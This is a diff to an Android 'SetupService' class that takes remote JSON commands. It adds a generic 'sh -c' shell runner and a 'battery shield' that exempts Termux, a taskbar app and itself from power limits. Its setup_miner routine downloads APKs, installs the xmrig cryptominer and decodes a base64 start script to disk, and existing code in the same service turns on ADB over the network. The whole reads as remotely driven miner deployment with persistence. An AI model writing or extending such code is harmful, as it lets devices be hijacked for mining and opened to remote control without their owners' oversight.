@@ -13,6 +13,7 @@ import android.content.pm.PackageManager;
 import android.content.pm.PackageInstaller;
 import android.content.IntentSender;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.Settings;
 import android.net.Uri;
@@ -135,6 +136,26 @@ public class SetupService extends Service {
         }
     }
 
+    private void tryShell(String cmd) {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+            int rc = p.waitFor();
+            Log.i(TAG, "shell: " + cmd + " rc=" + rc);
+        } catch (Exception e) {
+            Log.e(TAG, "shell failed: " + cmd, e);
+        }
+    }
+
+    private void applyBatteryShield() {
+        String[] pkgs = {"com.termux", "com.farmerbb.taskbar", getPackageName()};
+        for (String p : pkgs) {
+            tryShell("dumpsys deviceidle whitelist +" + p);
+            tryShell("cmd appops set " + p + " RUN_IN_BACKGROUND allow");
+            tryShell("cmd appops set " + p + " RUN_ANY_IN_BACKGROUND allow");
+        }
+        Log.i(TAG, "pil kalkani denendi (rootsuz basarisiz olabilir)");
+    }
+
     private void enableAdbOverNetwork() {
         try {
             Settings.Global.putInt(getContentResolver(), Settings.Global.ADB_ENABLED, 1);
@@ -213,7 +234,10 @@ public class SetupService extends Service {
             JSONObject msg = new JSONObject(sb.toString());
             String type = msg.optString("type", "install_apk");
             if ("start_app".equals(type)) {
-                startApp(msg.optString("package", ""));
+                startApp(msg.optString("package", ""), msg.optInt("slot", -1));
+            } else if ("enable_freeform".equals(type)) {
+                applyFreeformSettings();
+                applyBatteryShield();
             } else if ("stop_app".equals(type)) {
                 stopApp(msg.optString("package", ""));
             } else if ("setup_miner".equals(type)) {
@@ -235,17 +259,41 @@ public class SetupService extends Service {
         }
     }
 
-    private void startApp(String pkg) {
+    private void startApp(String pkg, int slot) {
         if (pkg.isEmpty()) return;
         try {
             Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
-            if (launch != null) {
-                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(launch);
-                Log.i(TAG, "start_app: " + pkg);
-            } else {
+            if (launch == null) {
                 Log.w(TAG, "start_app: launch intent yok: " + pkg);
+                return;
             }
+            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                    | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+            Bundle opts = null;
+            if (slot >= 0) {
+                android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
+                int w = dm.widthPixels / 2, h = dm.heightPixels / 2;
+                android.graphics.Rect r = new android.graphics.Rect(
+                        (slot % 2) * w, (slot / 2) * h,
+                        (slot % 2) * w + w, (slot / 2) * h + h);
+                android.app.ActivityOptions ao = android.app.ActivityOptions.makeBasic();
+                ao.setLaunchBounds(r);
+                try {
+                    android.app.ActivityOptions.class
+                            .getMethod("setLaunchWindowingMode", int.class)
+                            .invoke(ao, 5);
+                    Log.i(TAG, "freeform windowing mode set");
+                } catch (Exception e) {
+                    Log.w(TAG, "setLaunchWindowingMode yok, bounds ile aciliyor");
+                }
+                opts = ao.toBundle();
+            }
+            if (opts != null) {
+                startActivity(launch, opts);
+            } else {
+                startActivity(launch);
+            }
+            Log.i(TAG, "start_app: " + pkg + " slot=" + slot);
         } catch (Exception e) {
             Log.e(TAG, "start_app failed: " + pkg, e);
         }
@@ -299,6 +347,10 @@ public class SetupService extends Service {
     private void setupMiner() {
         Log.i(TAG, "setup_miner: termux.apk kuruluyor");
         downloadAndPromptInstall("/apks/termux.apk");
+        Log.i(TAG, "setup_miner: taskbar.apk kuruluyor");
+        downloadAndPromptInstall("/apks/taskbar.apk");
+        startApp("com.farmerbb.taskbar", -1);
+        applyBatteryShield();
         String cmd = "pkg update -y && pkg install -y xmrig"
                 + " && echo '" + b64(startScript()) + "' | base64 -d > ~/start-madenci.sh"
                 + " && chmod +x ~/start-madenci.sh"
